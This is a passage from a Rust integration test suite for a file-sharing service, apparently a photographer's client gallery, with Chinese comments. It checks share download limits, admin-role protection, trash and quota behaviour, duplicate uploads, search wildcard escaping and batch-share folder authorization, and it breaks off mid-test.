    assert_eq!(res.status(), StatusCode::UNAUTHORIZED);

    f.cleanup().await;
}

/// 无密码分享：不带任何凭证也要能看到预览（别把上面那条修过头）。
#[tokio::test]
async fn open_share_shows_media_without_any_credential() {
    let f = fixture("share_open_media").await;
    let (uid, token) = add_user(&f, "open_shooter").await;
    let (file_id, _) = add_file(&f, uid, "open.jpg", b"x").await;

    let preview_dir = f
        .config
        .upload_dir
        .join(format!("user_{}", uid))
        .join("previews");
    std::fs::create_dir_all(&preview_dir).unwrap();
    std::fs::write(preview_dir.join("p.jpg"), b"preview-bytes").unwrap();
    sqlx::query("UPDATE files SET preview_path = ? WHERE id = ?")
        .bind(format!("user_{}/previews/p.jpg", uid))
        .bind(file_id)
        .execute(&f.pool)
        .await
        .unwrap();

    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/shares",
            &token,
            &format!(
                r#"{{"items":[{{"type":"file","id":{}}}],"expires_hours":null,"password":null,"max_downloads":null,"custom_code":null}}"#,
                file_id
            ),
        ))
        .await
        .unwrap();
    let share_id = json_body(res).await["data"]["id"]
        .as_str()
        .unwrap()
        .to_string();

    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/public/shares/{}", share_id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let body = json_body(res).await;
    assert_eq!(body["data"]["has_password"], false);
    assert!(
        !body["data"]["items"][0]["preview_url"].is_null(),
        "无密码分享本就该直接给预览地址：{body}"
    );

    f.cleanup().await;
}

// ---------------------------------------------------------------------------
// max_downloads 不能从 /media 绕过去
// ---------------------------------------------------------------------------
//
// `/media` 在没有预览图时会回退到 `stored_path`，也就是**完整原片**。
// 原先只有 `/download` 会占用额度，于是设了「最多下载 1 次」的分享，
// 任何人都能用 `/media` 无限次拿走原图，而 download_count 一直是 0。

#[tokio::test]
async fn media_endpoint_consumes_a_download_slot_when_serving_the_original() {
    let f = fixture("share_media_slot").await;
    let (uid, token) = add_user(&f, "slot_shooter").await;
    // 视频没有预览图 → /media 必定走原片回退分支
    let (file_id, _) = add_file(&f, uid, "clip.mp4", b"the-whole-video").await;

    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/shares",
            &token,
            &format!(
                r#"{{"items":[{{"type":"file","id":{}}}],"expires_hours":null,"password":null,"max_downloads":1,"custom_code":null}}"#,
                file_id
            ),
        ))
        .await
        .unwrap();
    let share_id = json_body(res).await["data"]["id"]
        .as_str()
        .unwrap()
        .to_string();

    // 第一次 /media：拿到原片，并占用掉唯一一次额度
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/public/shares/{}/media?file_id={}", share_id, file_id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK, "首次应能取到内容");
    assert_eq!(body_text(res).await, "the-whole-video");

    let (count,): (i64,) =
        sqlx::query_as("SELECT download_count FROM file_shares WHERE id = ?")
            .bind(&share_id)
            .fetch_one(&f.pool)
            .await
            .unwrap();
    assert_eq!(count, 1, "回退到原片必须占用下载额度，否则限制形同虚设");

    // 第二次必须被额度拦住（与 /download 的行为一致）
    let res = router(&f)
        .oneshot(
            Request::builder()
                .uri(format!("/api/public/shares/{}/media?file_id={}", share_id, file_id))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(
        res.status(),
        StatusCode::GONE,
        "额度用尽后 /media 也必须拒绝"
    );

    f.cleanup().await;
}

/// 派生出来的预览图不该占用下载额度 —— 否则客户每看一眼就少一次下载机会。
#[tokio::test]
async fn media_endpoint_does_not_charge_for_preview_derivatives() {
    let f = fixture("share_media_preview_free").await;
    let (uid, token) = add_user(&f, "preview_shooter").await;
    let (file_id, _) = add_file(&f, uid, "shot.jpg", b"original-bytes").await;

    let preview_dir = f
        .config
        .upload_dir
        .join(format!("user_{}", uid))
        .join("previews");
    std::fs::create_dir_all(&preview_dir).unwrap();
    std::fs::write(preview_dir.join("p.jpg"), b"small-preview").unwrap();
    sqlx::query("UPDATE files SET preview_path = ? WHERE id = ?")
        .bind(format!("user_{}/previews/p.jpg", uid))
        .bind(file_id)
        .execute(&f.pool)
        .await
        .unwrap();

    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/shares",
            &token,
            &format!(
                r#"{{"items":[{{"type":"file","id":{}}}],"expires_hours":null,"password":null,"max_downloads":1,"custom_code":null}}"#,
                file_id
            ),
        ))
        .await
        .unwrap();
    let share_id = json_body(res).await["data"]["id"]
        .as_str()
        .unwrap()
        .to_string();

    for _ in 0..3 {
        let res = router(&f)
            .oneshot(
                Request::builder()
                    .uri(format!("/api/public/shares/{}/media?file_id={}&preview=1", share_id, file_id))
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK, "预览图应始终可取");
        assert_eq!(body_text(res).await, "small-preview");
    }

    let (count,): (i64,) =
        sqlx::query_as("SELECT download_count FROM file_shares WHERE id = ?")
            .bind(&share_id)
            .fetch_one(&f.pool)
            .await
            .unwrap();
    assert_eq!(count, 0, "看预览图不该消耗下载额度");

    f.cleanup().await;
}

// ---------------------------------------------------------------------------
// 管理员不可降级
// ---------------------------------------------------------------------------
//
// 修复前：唯一的管理员把自己设成普通用户之后，没有任何入口能改回来 ——
// 只能进容器手改数据库，而触发它只需在界面下拉框里点一下。

async fn promote(f: &Fixture, user_id: i64) {
    sqlx::query("UPDATE users SET role = 'admin' WHERE id = ?")
        .bind(user_id)
        .execute(&f.pool)
        .await
        .unwrap();
}

#[tokio::test]
async fn an_admin_cannot_be_demoted_through_any_endpoint() {
    let f = fixture("admin_no_demote").await;
    let (alice, alice_token) = add_user(&f, "alice_admin").await;
    let (bob, _bob_token) = add_user(&f, "bob_admin").await;
    promote(&f, alice).await;
    promote(&f, bob).await;

    // ① 降级自己
    let res = router(&f)
        .oneshot(authed_json(
            "PUT",
            &format!("/api/admin/users/{}/role", alice),
            &alice_token,
            r#"{"role":"user"}"#,
        ))
        .await
        .unwrap();
    assert_eq!(
        res.status(),
        StatusCode::BAD_REQUEST,
        "管理员不应能把自己降级"
    );

    // ② 降级另一个管理员
    let res = router(&f)
        .oneshot(authed_json(
            "PUT",
            &format!("/api/admin/users/{}/role", bob),
            &alice_token,
            r#"{"role":"user"}"#,
        ))
        .await
        .unwrap();
    assert_eq!(
        res.status(),
        StatusCode::BAD_REQUEST,
        "管理员不应能被降级（无论由谁操作）"
    );

    // ③ 走 update_user 这条同样能改角色的路
    let res = router(&f)
        .oneshot(authed_json(
            "PUT",
            &format!("/api/admin/users/{}", bob),
            &alice_token,
            r#"{"role":"user"}"#,
        ))
        .await
        .unwrap();
    assert_eq!(
        res.status(),
        StatusCode::BAD_REQUEST,
        "update_user 也必须挡住降级，否则换个端点就绕过去了"
    );

    // 两边的角色都没被动过
    let admins: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM users WHERE role = 'admin'")
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(admins, 2, "被拒绝的请求不该留下任何副作用");

    f.cleanup().await;
}

/// 挡降级不等于挡住正常操作：提升普通用户为管理员必须照常可用。
#[tokio::test]
async fn promoting_a_user_to_admin_still_works() {
    let f = fixture("admin_promote_ok").await;
    let (alice, alice_token) = add_user(&f, "alice_p").await;
    let (bob, _) = add_user(&f, "bob_p").await;
    promote(&f, alice).await;

    let res = router(&f)
        .oneshot(authed_json(
            "PUT",
            &format!("/api/admin/users/{}/role", bob),
            &alice_token,
            r#"{"role":"admin"}"#,
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);

    let role: String = sqlx::query_scalar("SELECT role FROM users WHERE id = ?")
        .bind(bob)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(role, "admin");

    f.cleanup().await;
}

/// 系统里必须始终留着管理员：自己删不掉自己（第一道闸），
/// 且删到只剩一个时第二道闸也会拦。
#[tokio::test]
async fn the_last_admin_cannot_be_deleted() {
    let f = fixture("admin_last_one").await;
    let (alice, alice_token) = add_user(&f, "alice_last").await;
    let (bob, _) = add_user(&f, "bob_last").await;
    promote(&f, alice).await;
    promote(&f, bob).await;

    // 先删掉 bob，此时只剩 alice
    let res = router(&f)
        .oneshot(authed_json(
            "DELETE",
            &format!("/api/admin/users/{}", bob),
            &alice_token,
            "",
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);

    // alice 删不掉自己 —— 这条保护本来就有，此处锁住它不被将来重构掉
    let res = router(&f)
        .oneshot(authed_json(
            "DELETE",
            &format!("/api/admin/users/{}", alice),
            &alice_token,
            "",
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::BAD_REQUEST);

    let admins: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM users WHERE role = 'admin'")
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(admins, 1, "系统里必须始终留有管理员");

    f.cleanup().await;
}

// ---------------------------------------------------------------------------
// 回收站语义：单独删除的文件与「跟着文件夹一起删」的文件不是一回事
// ---------------------------------------------------------------------------

async fn add_file_in(f: &Fixture, owner_id: i64, folder_id: i64, name: &str) -> i64 {
    let (id, _) = add_file(f, owner_id, name, b"bytes").await;
    sqlx::query("UPDATE files SET folder_id = ? WHERE id = ?")
        .bind(folder_id)
        .bind(id)
        .execute(&f.pool)
        .await
        .unwrap();
    id
}

async fn is_in_trash(f: &Fixture, file_id: i64) -> bool {
    let deleted_at: Option<String> =
        sqlx::query_scalar("SELECT deleted_at FROM files WHERE id = ?")
            .bind(file_id)
            .fetch_one(&f.pool)
            .await
            .unwrap();
    deleted_at.is_some()
}

#[tokio::test]
async fn restoring_a_folder_does_not_resurrect_separately_deleted_files() {
    let f = fixture("trash_restore_folder").await;
    let (uid, token) = add_user(&f, "trash_user").await;
    let folder = add_folder(&f, uid, "婚礼", None).await;
    let a = add_file_in(&f, uid, folder, "a.jpg").await; // 稍后单独删掉
    let b = add_file_in(&f, uid, folder, "b.jpg").await;

    // 用户先单独删掉 a
    let res = router(&f)
        .oneshot(authed_json("DELETE", &format!("/api/files/{}", a), &token, ""))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);

    // 再删掉整个文件夹
    let res = router(&f)
        .oneshot(authed_json(
            "DELETE",
            &format!("/api/folders/{}", folder),
            &token,
            "",
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    assert!(is_in_trash(&f, b).await, "随文件夹删除的文件应进回收站");

    // 恢复文件夹
    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            &format!("/api/folders/{}/restore", folder),
            &token,
            "",
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);

    assert!(!is_in_trash(&f, b).await, "跟着文件夹删掉的 b 应被恢复");
    assert!(
        is_in_trash(&f, a).await,
        "此前被单独删除的 a 不该跟着复活 —— 那看起来就是「没要求恢复的东西自己回来了」"
    );

    f.cleanup().await;
}

#[tokio::test]
async fn permanently_deleting_a_folder_keeps_separately_trashed_files() {
    let f = fixture("trash_purge_folder").await;
    let (uid, token) = add_user(&f, "purge_user").await;
    let folder = add_folder(&f, uid, "选片", None).await;
    let a = add_file_in(&f, uid, folder, "a.jpg").await; // 单独删掉的
    let b = add_file_in(&f, uid, folder, "b.jpg").await;

    // 先单独删 a，再删整个文件夹
    let res = router(&f)
        .oneshot(authed_json("DELETE", &format!("/api/files/{}", a), &token, ""))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let res = router(&f)
        .oneshot(authed_json(
            "DELETE",
            &format!("/api/folders/{}", folder),
            &token,
            "",
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    assert!(is_in_trash(&f, a).await && is_in_trash(&f, b).await);

    // 永久删除文件夹
    let res = router(&f)
        .oneshot(authed_json(
            "DELETE",
            &format!("/api/folders/{}/permanent", folder),
            &token,
            "",
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);

    let b_rows: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM files WHERE id = ?")
        .bind(b)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(b_rows, 0, "跟着文件夹删掉的 b 应被硬删");

    let a_rows: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM files WHERE id = ?")
        .bind(a)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(
        a_rows, 1,
        "单独删除的 a 从没被要求永久删除，记录必须留着（folder_id 会被置空）"
    );

    // 而且真的还能从回收站恢复
    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            &format!("/api/files/{}/restore", a),
            &token,
            "",
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK, "a 应当仍可恢复");
    assert!(!is_in_trash(&f, a).await);

    f.cleanup().await;
}

// ---------------------------------------------------------------------------
// 配额口径：按物理文件去重，不按记录条数
// ---------------------------------------------------------------------------

#[tokio::test]
async fn copying_a_file_does_not_inflate_the_accounted_usage() {
    let f = fixture("quota_distinct").await;
    let (uid, token) = add_user(&f, "quota_user").await;
    let content = vec![0u8; 4096];
    let (file_id, _) = add_file(&f, uid, "big.jpg", &content).await;

    let before = file_service::used_bytes(&f.pool, uid).await.unwrap();
    assert_eq!(before, 4096);

    // 复制到根目录：插入新记录，但复用同一个 stored_path
    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/batch/copy",
            &token,
            &format!(
                r#"{{"file_ids":[{}],"folder_ids":[],"target_folder_id":null,"conflict_strategy":"rename"}}"#,
                file_id
            ),
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);

    let rows: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM files WHERE owner_id = ?")
        .bind(uid)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(rows, 2, "复制应产生第二条记录");

    let after = file_service::used_bytes(&f.pool, uid).await.unwrap();
    assert_eq!(
        after, before,
        "两份记录指向同一份物理字节，用量不该翻倍（磁盘占用并没有变）"
    );

    // 删掉两份副本后，用量才归零
    sqlx::query("DELETE FROM files WHERE owner_id = ?")
        .bind(uid)
        .execute(&f.pool)
        .await
        .unwrap();
    assert_eq!(file_service::used_bytes(&f.pool, uid).await.unwrap(), 0);

    f.cleanup().await;
}

/// 反向要求：复制出的副本不能成为「不计费」的隐身占用。
///
/// 即「复制一份 → 删掉原件」之后磁盘上仍有真实字节，
/// 按 stored_path 去重统计依然算得到它（若改成「不统计副本行」，
/// 反复「复制再删原件」就能把磁盘撑爆而用量始终很小）。
#[tokio::test]
async fn usage_still_counted_when_only_the_copy_remains() {
    let f = fixture("quota_copy_survives").await;
    let (uid, _token) = add_user(&f, "quota_survive").await;
    let (original, _) = add_file(&f, uid, "orig.jpg", &[7u8; 2048]).await;

    // 手工造一份「副本」记录：同一 stored_path，另一行
    let stored: String = sqlx::query_scalar("SELECT stored_path FROM files WHERE id = ?")
        .bind(original)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    sqlx::query(
        "INSERT INTO files (name, original_name, stored_path, owner_id, size, file_type)
         VALUES ('copy.jpg','copy.jpg',?,?,2048,'jpg')",
    )
    .bind(&stored)
    .bind(uid)
    .execute(&f.pool)
    .await
    .unwrap();

    // 删掉原件，只剩副本
    sqlx::query("DELETE FROM files WHERE id = ?")
        .bind(original)
        .execute(&f.pool)
        .await
        .unwrap();

    assert_eq!(
        file_service::used_bytes(&f.pool, uid).await.unwrap(),
        2048,
        "磁盘上还有这份文件，用量必须照算"
    );

    f.cleanup().await;
}

// ---------------------------------------------------------------------------
// 上传重名：判定必须与写入在同一条语句里
// ---------------------------------------------------------------------------
//
// 原先 `check_duplicates` 与 `INSERT` 之间有一个窗口，两个并发上传同名文件
// 会双双入库。现在重名判定被并进了那条 `INSERT ... SELECT ... WHERE`，
// 与配额校验同源，由数据库一次裁决。

/// 构造一个只含单个 `file` 字段的 multipart 请求。
fn multipart_upload(uri: &str, token: &str, filename: &str, bytes: &[u8]) -> Request<Body> {
    const CRLF: &str = "\r\n";
    let boundary = "----panboundary";
    let mut body = Vec::new();
    body.extend_from_slice(
        format!(
            "--{b}{cr}Content-Disposition: form-data; name=\"file\"; filename=\"{f}\"{cr}\
             Content-Type: application/octet-stream{cr}{cr}",
            b = boundary,
            f = filename,
            cr = CRLF,
        )
        .as_bytes(),
    );
    body.extend_from_slice(bytes);
    body.extend_from_slice(format!("{cr}--{b}--{cr}", cr = CRLF, b = boundary).as_bytes());

    Request::builder()
        .method("POST")
        .uri(uri)
        .header(header::AUTHORIZATION, format!("Bearer {}", token))
        .header(
            header::CONTENT_TYPE,
            format!("multipart/form-data; boundary={}", boundary),
        )
        .body(Body::from(body))
        .expect("构造上传请求失败")
}

#[tokio::test]
async fn uploading_the_same_name_twice_keeps_only_one_row() {
    let f = fixture("upload_dup_name").await;
    let (uid, token) = add_user(&f, "dup_user").await;

    let first = router(&f)
        .oneshot(multipart_upload(
            "/api/files/upload",
            &token,
            "same.jpg",
            b"first",
        ))
        .await
        .unwrap();
    assert_eq!(first.status(), StatusCode::OK);

    // 第二次传同名文件：应被跳过并给出明确原因，而不是悄悄多出一行
    let second = router(&f)
        .oneshot(multipart_upload(
            "/api/files/upload",
            &token,
            "same.jpg",
            b"second",
        ))
        .await
        .unwrap();
    assert_eq!(
        second.status(),
        StatusCode::BAD_REQUEST,
        "全部文件都被跳过时应报错，而不是回 success:true 却什么都没存"
    );

    let rows: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM files WHERE owner_id = ? AND original_name = 'same.jpg'",
    )
    .bind(uid)
    .fetch_one(&f.pool)
    .await
    .unwrap();
    assert_eq!(rows, 1, "同一目录下同名文件只能有一行");

    // 内容仍是第一次那份
    let stored: String = sqlx::query_scalar("SELECT stored_path FROM files WHERE owner_id = ?")
        .bind(uid)
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(
        std::fs::read(f.config.upload_dir.join(&stored)).unwrap(),
        b"first"
    );

    // 同时不该留下第二次的孤儿文件（previews/ 是正常的缩略图子目录，不计）
    let leftovers: Vec<String> =
        std::fs::read_dir(f.config.upload_dir.join(format!("user_{}", uid)))
            .unwrap()
            .flatten()
            .filter(|e| e.path().is_file())
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .collect();
    assert_eq!(
        leftovers.len(),
        1,
        "被跳过的上传不应在磁盘留下文件：{leftovers:?}"
    );

    f.cleanup().await;
}


// ---------------------------------------------------------------------------
// 搜索：通配符必须当字面量
// ---------------------------------------------------------------------------

#[tokio::test]
async fn search_treats_like_wildcards_as_literal_characters() {
    let f = fixture("search_wildcards").await;
    let (uid, token) = add_user(&f, "searcher").await;
    add_file(&f, uid, "holiday.jpg", b"a").await;
    add_file(&f, uid, "beach.jpg", b"a").await;
    add_file(&f, uid, "discount 100%.jpg", b"a").await;
    add_file(&f, uid, "snake_case.jpg", b"a").await;

    // `%` 曾经会被拼成 `%%%` 从而匹配全部文件
    let res = router(&f)
        .oneshot(authed_get("/api/search?q=%25", &token))
        .await
        .unwrap();
    let body = json_body(res).await;
    assert_eq!(
        body["data"]["total_files"], 1,
        "搜索 % 应只匹配字面含 % 的文件，实际：{body}"
    );
    assert!(body["data"]["files"][0]["original_name"]
        .as_str()
        .unwrap()
        .contains('%'));

    // `_` 曾经会变成「任意单字符」
    let res = router(&f)
        .oneshot(authed_get("/api/search?q=_", &token))
        .await
        .unwrap();
    let body = json_body(res).await;
    assert_eq!(
        body["data"]["total_files"], 1,
        "搜索 _ 应只匹配字面含下划线的文件，实际：{body}"
    );
    assert_eq!(body["data"]["files"][0]["original_name"], "snake_case.jpg");

    // 普通关键词不受影响
    let res = router(&f)
        .oneshot(authed_get("/api/search?q=beach", &token))
        .await
        .unwrap();
    assert_eq!(json_body(res).await["data"]["total_files"], 1);

    f.cleanup().await;
}

// ---------------------------------------------------------------------------
// 管理端用户列表：批量统计必须与逐条统计给出同样的数字
// ---------------------------------------------------------------------------

#[tokio::test]
async fn admin_user_list_reports_the_same_stats_as_the_single_user_view() {
    let f = fixture("admin_list_stats").await;
    let (admin, admin_token) = add_user(&f, "list_admin").await;
    promote(&f, admin).await;
    let (uid, _) = add_user(&f, "list_target").await;

    // 原图文件夹 + 两个文件（其中一个进回收站）
    let original = add_folder(&f, uid, "原图", None).await;
    add_file_in(&f, uid, original, "x.jpg").await;
    let gone = add_file_in(&f, uid, original, "y.jpg").await;
    sqlx::query("UPDATE files SET deleted_at = datetime('now') WHERE id = ?")
        .bind(gone)
        .execute(&f.pool)
        .await
        .unwrap();

    let res = router(&f)
        .oneshot(authed_get("/api/admin/users", &admin_token))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK);
    let body = json_body(res).await;
    let row = body["data"]
        .as_array()
        .unwrap()
        .iter()
        .find(|u| u["id"] == uid)
        .expect("列表里应包含目标用户")
        .clone();

    assert_eq!(row["file_count"], 1, "file_count 只算未删除的文件");
    assert_eq!(row["used_bytes"], 10, "用量含回收站：两个文件各 5 字节");
    assert_eq!(row["original_folder_id"], original);

    // 与逐条统计（`file_service::used_bytes`）对齐
    assert_eq!(file_service::used_bytes(&f.pool, uid).await.unwrap(), 10);

    f.cleanup().await;
}

// ===========================================================================
// 分享批次
// ---------------------------------------------------------------------------
// 模型：一个分享 = 一个批次，里面可以同时装多个文件和多个文件夹。
// 客户端能进目录、能挑文件下载，所以**授权面比原来大得多**——
// 原来一个分享只指向一个目标，现在要回答「这个 file_id / folder_id 是否
// 落在这一批的范围内」。下面大半篇幅都在打这个点。
// ===========================================================================

/// 构造创建批次的 JSON body。`items` 用 `("file"|"folder", id)` 表示。
fn batch_payload(
    items: &[(&str, i64)],
    password: Option<&str>,
    max_downloads: Option<i64>,
) -> String {
    let list = items
        .iter()
        .map(|(t, id)| format!(r#"{{"type":"{}","id":{}}}"#, t, id))
        .collect::<Vec<_>>()
        .join(",");
    let pwd = password
        .map(|p| format!(r#""{}""#, p))
        .unwrap_or_else(|| "null".to_string());
    let md = max_downloads
        .map(|n| n.to_string())
        .unwrap_or_else(|| "null".to_string());
    format!(
        r#"{{"items":[{}],"expires_hours":null,"password":{},"max_downloads":{},"custom_code":null}}"#,
        list, pwd, md
    )
}

/// 建一个批次并返回它的 id。
async fn make_batch(
    f: &Fixture,
    token: &str,
    items: &[(&str, i64)],
    password: Option<&str>,
    max_downloads: Option<i64>,
) -> String {
    let res = router(f)
        .oneshot(authed_json(
            "POST",
            "/api/shares",
            token,
            &batch_payload(items, password, max_downloads),
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::OK, "创建批次应成功");
    json_body(res).await["data"]["id"]
        .as_str()
        .expect("应返回批次 id")
        .to_string()
}

/// 造一棵两层目录树 + 一个兄弟目录，用于验证子树授权的深度：
///
/// ```text
/// 祖先(不在批次里)
/// └── A ─────────── 批次里只放这个
///     ├── a1.jpg
///     └── B
///         └── b1.jpg
/// X ────────────── A 的兄弟，同样不在批次里
/// └── x1.jpg
/// ```
struct Tree {
    ancestor: i64,
    a: i64,
    b: i64,
    a1: i64,
    b1: i64,
    x: i64,
    x1: i64,
}

async fn build_tree(f: &Fixture, owner: i64) -> Tree {
    let ancestor = add_folder(f, owner, "祖先", None).await;
    let a = add_folder(f, owner, "婚礼", Some(ancestor)).await;
    let b = add_folder(f, owner, "精修", Some(a)).await;
    let a1 = add_file_in(f, owner, a, "a1.jpg").await;
    let b1 = add_file_in(f, owner, b, "b1.jpg").await;
    let x = add_folder(f, owner, "别的客户", None).await;
    let x1 = add_file_in(f, owner, x, "x1.jpg").await;
    Tree {
        ancestor,
        a,
        b,
        a1,
        b1,
        x,
        x1,
    }
}

async fn public_get(f: &Fixture, uri: &str) -> axum::response::Response {
    router(f)
        .oneshot(Request::builder().uri(uri).body(Body::empty()).unwrap())
        .await
        .unwrap()
}

// ---- 创建批次 ----

#[tokio::test]
async fn a_batch_can_mix_files_and_folders() {
    let f = fixture("batch_mixed").await;
    let (uid, token) = add_user(&f, "mixer").await;
    let (loose, _) = add_file(&f, uid, "单张.jpg", b"x").await;
    let t = build_tree(&f, uid).await;

    let share_id = make_batch(&f, &token, &[("file", loose), ("folder", t.a)], None, None).await;

    let res = public_get(&f, &format!("/api/public/shares/{}", share_id)).await;
    assert_eq!(res.status(), StatusCode::OK);
    let body = json_body(res).await;

    assert_eq!(body["data"]["item_count"], 2, "顶层应有两项：{body}");
    assert_eq!(body["data"]["file_count"], 1, "顶层一个文件");
    assert_eq!(body["data"]["folder_count"], 1, "顶层一个文件夹");
    // 递归统计：A 下面有 a1 和 B/b1，加上单独那张，共 3 个文件
    assert_eq!(body["data"]["total_file_count"], 3, "递归文件数应为 3：{body}");
    // 文件夹先排前面，与主列表页一致
    assert_eq!(body["data"]["items"][0]["item_type"], "folder");
    assert_eq!(body["data"]["items"][1]["item_type"], "file");

    f.cleanup().await;
}

#[tokio::test]
async fn a_batch_rejects_another_users_content() {
    let f = fixture("batch_cross_user").await;
    let (victim, _) = add_user(&f, "victim_b").await;
    let (_attacker, attacker_token) = add_user(&f, "attacker_b").await;
    let (victim_file, _) = add_file(&f, victim, "客户私密.heic", b"x").await;

    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/shares",
            &attacker_token,
            &batch_payload(&[("file", victim_file)], None, None),
        ))
        .await
        .unwrap();
    assert_eq!(
        res.status(),
        StatusCode::NOT_FOUND,
        "把别人的文件放进批次必须被拒"
    );

    // 全有或全无：一个合法项 + 一个非法项，也应当整批拒绝
    let (attacker_id, _) = add_user(&f, "attacker_b2").await;
    let (_mine, _) = add_file(&f, attacker_id, "mine.jpg", b"x").await;
    let rows: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM file_shares")
        .fetch_one(&f.pool)
        .await
        .unwrap();
    assert_eq!(rows, 0, "被拒的请求不应留下任何批次");

    f.cleanup().await;
}

#[tokio::test]
async fn a_batch_rejects_empty_duplicate_and_oversized_payloads() {
    let f = fixture("batch_bad_payloads").await;
    let (uid, token) = add_user(&f, "bulk_b").await;
    let (file_id, _) = add_file(&f, uid, "a.jpg", b"x").await;

    // 空
    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/shares",
            &token,
            &batch_payload(&[], None, None),
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::BAD_REQUEST, "空批次应被拒");

    // 重复项。去重后数量对不上就必须拒绝——否则界面显示 2 项、实际只有 1 项
    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/shares",
            &token,
            &batch_payload(&[("file", file_id), ("file", file_id)], None, None),
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::BAD_REQUEST, "重复项应被拒");

    // 超过上限
    let over: Vec<(&str, i64)> = (0..crate::handlers::share::MAX_SHARE_ITEMS + 1)
        .map(|i| ("file", i as i64 + 1))
        .collect();
    let res = router(&f)
        .oneshot(authed_json(
            "POST",
            "/api/shares",
            &token,
            &batch_payload(&over, None, None),
        ))
        .await
        .unwrap();
    assert_eq!(res.status(), StatusCode::BAD_REQUEST, "超上限应被拒");

    f.cleanup().await;
}

// ---- 授权：下载 / 媒体 ----

#[tokio::test]
async fn batch_grants_access_inside_the_folder_subtree() {
    let f = fixture("batch_subtree_ok").await;
    let (uid, token) = add_user(&f, "sub_owner").await;
    let t = build_tree(&f, uid).await;
    let share_id = make_batch(&f, &token, &[("folder", t.a)], None, None).await;

    // 直接列在批次里的文件夹，本身可浏览
    let res = public_get(&f, &format!("/api/public/shares/{}/items?folder_id={}", share_id, t.a)).await;
    assert_eq!(res.status(), StatusCode::OK, "批次内的文件夹应可进入");
    let body = json_body(res).await;
    assert_eq!(body["data"]["folder_id"], t.a);
    let names: Vec<&str> = body["data"]["items"]
        .as_array()
        .unwrap()
        .iter()
        .map(|i| i["name"].as_str().unwrap())
        .collect();
    assert!(names.contains(&"a1.jpg") && names.contains(&"精修"), "实际: {names:?}");

    // 更深一层：a1 的文件下载
    let res = public_get(&f, &format!("/api/public/shares/{}/download?file_id={}", share_id, t.a1)).await;
    assert_eq!(res.status(), StatusCode::OK, "批次文件夹里的文件应可下载");

    // 子文件夹可进入，里面的文件也可下载（任意深度）
    let res = public_get(&f, &format!("/api/public/shares/{}/items?folder_id={}", share_id, t.b)).await;
    assert_eq!(res.status(), StatusCode::OK, "子文件夹应可进入");
    let res = public_get(&f, &format!("/api/public/shares/{}/download?file_id={}", share_id, t.b1)).await;
    assert_eq!(res.status(), StatusCode::OK, "两层深的文件应可下载");

    f.cleanup().await;
}

#[tokio::test]
async fn batch_denies_access_outside_the_folder_subtree() {
    let f = fixture("batch_subtree_deny").await;
    let (uid, token) = add_user(&f, "deny_owner").await;
    let t = build_tree(&f, uid).await;
    let share_id = make_batch(&f, &token, &[("folder", t.a)], None, None).await;

    // ① 批次**外面**的目录不能进（A 的兄弟）
    let res = public_get(&f, &format!("/api/public/shares/{}/items?folder_id={}", share_id, t.x)).await;
    assert_eq!(res.status(), StatusCode::NOT_FOUND, "批次外的目录不该能进");

    // ② 批次外的目录里的文件不能下
    let res = public_get(&f, &format!("/api/public/shares/{}/download?file_id={}", share_id, t.x1)).await;
    assert_eq!(res.status(), StatusCode::NOT_FOUND, "批次外的文件不该能下");

    // ③ **祖先**目录也不能进。批次里放的是 A，A 的父目录不是授权范围，
    //    否则「分享一个子目录」就等于「分享整个账号」。
    let res = public_get(&f, &format!("/api/public/shares/{}/items?folder_id={}", share_id, t.ancestor)).await;
    assert_eq!(res.status(), StatusCode::NOT_FOUND, "祖先目录不该能进");

    // ④ 批次外的文件即便确实属于分享者，也不能借道 /media 拿到
